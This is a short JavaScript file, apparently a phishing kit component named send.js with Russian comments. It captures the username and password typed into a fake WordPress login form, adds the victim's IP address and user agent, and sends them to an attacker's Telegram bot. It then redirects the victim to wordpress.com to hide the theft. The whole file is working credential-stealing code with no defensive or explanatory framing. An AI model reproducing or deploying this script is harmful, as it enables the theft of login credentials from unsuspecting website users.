document.getElementById('loginform').addEventListener('submit', async function(e) {
    e.preventDefault();
    console.log("Скрипт send.js начал работу!");

    const formData = new FormData(this);
    const login = formData.get('log');
    const password = formData.get('pwd');

    // Добавляем User Agent к сообщению
    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS  🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
    console.log("Сообщение для отправки:", message);

    try {
        console.log("Пытаюсь отправить в Telegram...");
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        const responseData = await response.json();
        console.log("Ответ от Telegram API:", responseData);

        if (response.ok) {
            console.log("Успешно отправлено! Перенаправляю...");
            // Меняем редирект на официальный сайт WordPress
            setTimeout(() => {
                window.location.href = 'https://wordpress.com/';
            }, 1500);
        } else {
            console.error("Ошибка от Telegram:", responseData);
            window.location.href = 'https://wordpress.com/';
        }

    } catch (error) {
        console.error('Ошибка сети или отправки:', error);
        window.location.href = 'https://wordpress.com/';
    }
});

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Не удалось определить';
    }
}